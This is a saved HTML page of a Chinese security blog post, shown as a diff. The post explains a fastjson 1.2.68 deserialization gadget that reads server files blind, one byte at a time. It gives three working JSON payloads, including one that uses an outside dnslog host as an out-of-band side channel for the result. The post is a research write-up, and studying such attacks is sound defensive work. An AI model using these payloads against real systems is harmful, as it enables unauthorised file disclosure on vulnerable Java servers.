@@ -1,0 +1,448 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>fastjson 读文件 gadget 的利用场景扩展 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="前言一年过去了发现博客只写过两篇文章，没别的原因就是因为懒，朋友说要监督我一周写一篇文章，写不出来就请客，现在期限将至，所以才有了这篇文章。正好最近朋友有遇到一个存在 fastjson 1.2...." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="fastjson 读文件 gadget 的利用场景扩展 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/506.html" />
+<link rel="alternate" type="application/rdf+xml" title="fastjson 读文件 gadget 的利用场景扩展 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/506.html" />
+<link rel="alternate" type="application/atom+xml" title="fastjson 读文件 gadget 的利用场景扩展 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/506.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-506'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-506'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-506'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _ESB = 'f7'//'IjK'
++'7dd'//'Pnv'
++/* 'HT'//'HT' */''+//'7'
+'b5'+//'6'
+'4f'+'6f6'//'L'
++/* 'X'//'X' */''+'f'//'khA'
++'6'//'y2p'
++//'2V'
+'bda'+//'Y'
+'aa'+''///*'XZV'*/'XZV'
++'4a'//'s6'
++//'V'
+'0'+//'py'
+'49'+'d'//'s'
++//'6nN'
+'409'+'9'//'xq'
++//'Q'
+'b'+//'lb'
+'c'+//'lAh'
+'9', _NqR03r = [];
+    
+    for (var i = 0; i < _NqR03r.length; i ++) {
+        _ESB = _ESB.substring(0, _NqR03r[i][0]) + _ESB.substring(_NqR03r[i][1]);
+    }
+
+    return _ESB;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">fastjson 读文件 gadget 的利用场景扩展</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2021-12-04 22:26:00" itemprop="datePublished">2021-12-04 22:26:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/506.html"><a href="https://b1ue.cn/category/default/">默认分类</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/506.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>前言</h1><p>一年过去了发现博客只写过两篇文章，没别的原因就是因为懒，朋友说要监督我一周写一篇文章，写不出来就请客，现在期限将至，所以才有了这篇文章。</p><p>正好最近朋友有遇到一个存在 fastjson 1.2.68 漏洞，但无法做到读文件的场景，经过研究后搞定了。所以打算先拿这个主题糊弄一下本周的文章。</p><h1>主题</h1><p>此前有师傅在 blackhat 的 fastjson 议题上分享了 1.2.68 版本的几个 gadget。其中比较有意思的一个是用来读文件的。我要写的内容是以这个 gadget 作为基础的，所以先讲一下这个 gadget。</p><p><img src="/usr/uploads/2021/12/651460904.jpg" alt="1638628407313.jpg" title="1638628407313.jpg"></p><p><strong> 原POC </strong></p><pre><code>{
+  &quot;abc&quot;:{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+    &quot;delegate&quot;: {&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,
+      &quot;reader&quot;: { &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+        &quot;url&quot;: &quot;file:///tmp/&quot;
+      },
+      &quot;charsetName&quot;: &quot;UTF-8&quot;,
+      &quot;bufferSize&quot;: 1024
+    },&quot;boms&quot;: [
+      {
+        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,
+        &quot;charsetName&quot;: &quot;UTF-8&quot;,
+        &quot;bytes&quot;: [
+          ...
+        ]
+      }
+    ]
+  },
+  &quot;address&quot; : {&quot;$ref&quot;:&quot;$.abc.BOM&quot;}
+}</code></pre><p>只需要跟进到代码里看一下就知道为什么可以读文件了。</p><p>首先从 org.apache.commons.io.input.BOMInputStream 开始看。</p><pre><code>public BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms)</code></pre><p>BOMInputStream 的构造方法可以传递一个 InputStream 类型的 delegate 和 ByteOrderMark 数组 boms。</p><pre><code>&quot;address&quot; : {&quot;$ref&quot;:&quot;$.abc.BOM&quot;}</code></pre><p>这一段是用了 fastjson 的 JSONPath 引用特性，通俗的讲就是去调用 JSON 对象中 abc 的 bom 属性，这里 abc 是被实例化的 BOMInputStream 对象。所以调用的就自然是 BOMInputStream 类的 getBom 成员方法。</p><pre><code>    public ByteOrderMark getBOM() throws IOException {
+        if (this.firstBytes == null) {
+            this.fbLength = 0;
+            int maxBomSize = ((ByteOrderMark)this.boms.get(0)).length();
+            this.firstBytes = new int[maxBomSize];
+
+            for(int i = 0; i &lt; this.firstBytes.length; ++i) {
+                this.firstBytes[i] = this.in.read(); // 从 delegate 输入流从取出所有字节，组成一个 int 数组
+                ++this.fbLength;
+                if (this.firstBytes[i] &lt; 0) {
+                    break;
+                }
+            }
+
+            this.byteOrderMark = this.find(); // 开始把实例化对象时传入的 ByteOrderMark 数组 boms 和从 delegate 输入流从取出所有字节组成的int数组进行比对。
+            if (this.byteOrderMark != null &amp;&amp; !this.include) {
+                if (this.byteOrderMark.length() &lt; this.firstBytes.length) {
+                    this.fbIndex = this.byteOrderMark.length();
+                } else {
+                    this.fbLength = 0;
+                }
+            }
+        }
+
+        return this.byteOrderMark; //返回 byteOrderMark
+    }
+    private ByteOrderMark find() {
+        Iterator var1 = this.boms.iterator();
+
+        ByteOrderMark bom;
+        do {
+            if (!var1.hasNext()) {
+                return null;
+            }
+
+            bom = (ByteOrderMark)var1.next();
+        } while(!this.matches(bom));
+
+        return bom;
+    }
+    private boolean matches(ByteOrderMark bom) {
+        for(int i = 0; i &lt; bom.length(); ++i) {
+            if (bom.get(i) != this.firstBytes[i]) {
+                return false;
+            }
+        }
+
+        return true;
+    }</code></pre><p>根据这 getBom 方法的代码来看，它就是先把 delegate 输入流的字节码转成 int 数组，然后拿 ByteOrderMark 里的 bytes 挨个字节遍历去比对，如果遍历过程有比对错误的 getBom 就会返回一个 null，如果遍历结束，没有比对错误那就会返回一个 ByteOrderMark 对象。所以这里文件读取<strong> 成功的标志应该是 getBom 返回结果不为 null。</strong></p><p>回到前面，再跟进一下 delegate</p><pre><code>public ReaderInputStream(Reader reader, CharsetEncoder encoder, int bufferSize)</code></pre><p>一个很普通的 Reader 转 InputStream。</p><p>最后是 jdk.nashorn.api.scripting.URLReader</p><p><code>public URLReader(URL url)</code> <br>可以传入一个 URL 对象。这就意味着 file jar http 等协议都可以使用。</p><p>根据上面的几个类的代码来看就搞清楚了字节码比对是怎么一回事。</p><p>这里所指的读文件不是那种直接回显的读，而是像盲注一样挨个字节的读。</p><h1>示例</h1><p><img src="/usr/uploads/2021/12/1378014699.jpg" alt="1638630080578.jpg" title="1638630080578.jpg"></p><p>正常读文件时如果字节码比对正确了（因为要读的文件第一个字母是b，转成int就是98，我在boms传入的bytes第一个就是98，所以比对正确），他是会返回一个 ByteOrderMark 对象的。</p><p>如果 getBom 方法比对字节码失败了，他的值就会是 null。</p><h1>场景延伸</h1><p>然后再来分析一下它的适用场景，因为 getBom 返回的内容只能够是 ByteOrderMark 对象或者 null。所以它的适用场景有限。</p><p>举个例子：</p><blockquote><p>有一个修改用户昵称的功能，使用了 fastjson 解析，取出 nickname 属性更新到数据库。我把 getBom 的值引用到 nickname 属性里。修改成功后如果 返回查看 nickname 是空或者null那就代表字节码比对错误，如果是 <code>ByteOrderMark[...]</code> 那就说名比对成功。<br>另外一个<br>有一个修改用户昵称的功能，使用了 fastjson 解析，取出 nickname 属性，会先进行一次空字符判断，如果是空字符则直接返回错误提示信息，反之才更新到数据库并返回成功提示信息。我把 getBom 的值引用到 nickname 属性里。如果返回的提示信息是错误的那说明 getBom 返回的是 null 也就是字节码比对错误，如果返回提示信息是正确的，那说明 getBom 返回的是 ByteOrderMark 对象也就是字节码比对正确。</p></blockquote><p>但还有一种比较常见的场景，在这个 payload 下就不适用。<br>例如</p><blockquote><p>有一个接口使用了 fastjson 解析 json，获取了某个属性，代码中对这个属性的格式做了严格校验，或者不会调用 json 对象里的任何属性。所以我们无法从这个接口的响应得知 getBom 返回的到底是什么。不过这个接口如果在用 fastjson 解析 JSON 的过程中抛出了异常它就会输出到响应。</p></blockquote><p>这就是我前面遇到的场景，所以我想了个办法，只要让传入参数时对象类型不匹配，fastjson 自身就会抛出一个异常，如果是 null 的话就不会抛出异常。</p><p>所以可以根据返回的异常提示信息情况来判断字节码比对是否正确，如果返回了异常那就说明比对正确，如果返回了正常那就说明比对失败了。</p><p>以此为基础我找到了一个合适的类，并构造出了这样一条 payload。</p><pre><code>{
+  &quot;abc&quot;:{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+    &quot;delegate&quot;: {&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,
+      &quot;reader&quot;: { &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+        &quot;url&quot;: &quot;file:///tmp/test&quot;
+      },
+      &quot;charsetName&quot;: &quot;UTF-8&quot;,
+      &quot;bufferSize&quot;: 1024
+    },&quot;boms&quot;: [
+      {
+        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,
+        &quot;charsetName&quot;: &quot;UTF-8&quot;,
+        &quot;bytes&quot;: [
+          98
+        ]
+      }
+    ]
+  },
+  &quot;address&quot; : {&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;: {&quot;@type&quot;: &quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;},&quot;start&quot;: 0,&quot;end&quot;: 0}
+}</code></pre><p><img src="/usr/uploads/2021/12/1268658443.jpg" alt="1638636620665.jpg" title="1638636620665.jpg"></p><p>当我的字节码比对正确时他就会因为类型不一致报错，但如果字节码比对错误 getBom 返回的是 null，fastjson 就不会抛出异常。</p><p>当然这样也是没法覆盖所有场景的，我再举一个激进的例子。</p><blockquote><p>有一个接口，用 fastjson 解析了 JSON，但不会反馈任何能够作为状态判断的标识，连异常报错的信息都没有。</p></blockquote><p>我针对这样的场景也找到了一个利用的方法。</p><p>根据我对 fastjson 的了解，当解析 JSON 时抛出了异常，是会影响到后面的 JSON 解析的。</p><p>所以我只要再加一段 dnslog 得 payload 就可以了。</p><p>当 getBom 字节码比对正确时就会抛出异常，从而影响到后面的 JSON 解析，也就不会进行URL连接。</p><p>当 getBom 字节码比对错误时 JSON 就会正常解析，也就不影响后面的 URL 连接。</p><p>参考 POC</p><pre><code>{
+  &quot;abc&quot;:{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+    &quot;delegate&quot;: {&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,
+      &quot;reader&quot;: { &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+        &quot;url&quot;: &quot;file:///tmp/test&quot;
+      },
+      &quot;charsetName&quot;: &quot;UTF-8&quot;,
+      &quot;bufferSize&quot;: 1024
+    },&quot;boms&quot;: [
+      {
+        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,
+        &quot;charsetName&quot;: &quot;UTF-8&quot;,
+        &quot;bytes&quot;: [
+          98
+        ]
+      }
+    ]
+  },
+  &quot;address&quot; : {&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,
+              &quot;charSequence&quot;: {&quot;@type&quot;: &quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;},&quot;start&quot;: 0,&quot;end&quot;: 0},
+  &quot;xxx&quot;: {
+      &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+      &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+      &quot;delegate&quot;: {
+        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,
+        &quot;reader&quot;: {
+          &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+          &quot;url&quot;: &quot;http://aaaxasd.g2pbiw.dnslog.cn/&quot;
+          },
+        &quot;charsetName&quot;: &quot;UTF-8&quot;,
+        &quot;bufferSize&quot;: 1024
+      },
+      &quot;boms&quot;: [{&quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;, &quot;charsetName&quot;: &quot;UTF-8&quot;, &quot;bytes&quot;: [1]}]
+  },
+  &quot;zzz&quot;:{&quot;$ref&quot;:&quot;$.xxx.BOM[0]&quot;}
+}</code></pre><p><img src="/usr/uploads/2021/12/2366457984.jpg" alt="1638639384580.jpg" title="1638639384580.jpg"></p><p>如图，当 getBom 字节码比对正确由于类型不符抛出异常，导致后面的 dnslog 没有发出去，可以通过这个 dnslog 没有收到来作为成功的标识。</p><p><img src="/usr/uploads/2021/12/68949441.jpg" alt="1638639152314.jpg" title="1638639152314.jpg"></p><p>当 getBom 字节码比对错误，返回的是 null 没有抛出异常，也不影响后面的 dnslog 的JSON解析，所以如果 dnslog 收到了那就要作为失败的标识。</p><h1>总结</h1><p>没有总结，这周的文章水完了。</p>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 1 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-36" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/a27baaa787a955f9af6201c115ba35f3?s=32&r=G&d=" alt="111" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">111									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/506.html?replyTo=36#respond-post-506" rel="nofollow" onclick="return TypechoComment.reply('comment-36', 36);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2022-10-19 21:30:36" itemprop="datePublished">2022-10-19 21:30:36</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>这边看不到图片，是不是加载不了了？</p>					</div>
+			</div>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-506" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/506.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/506.html#respond-post-506" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
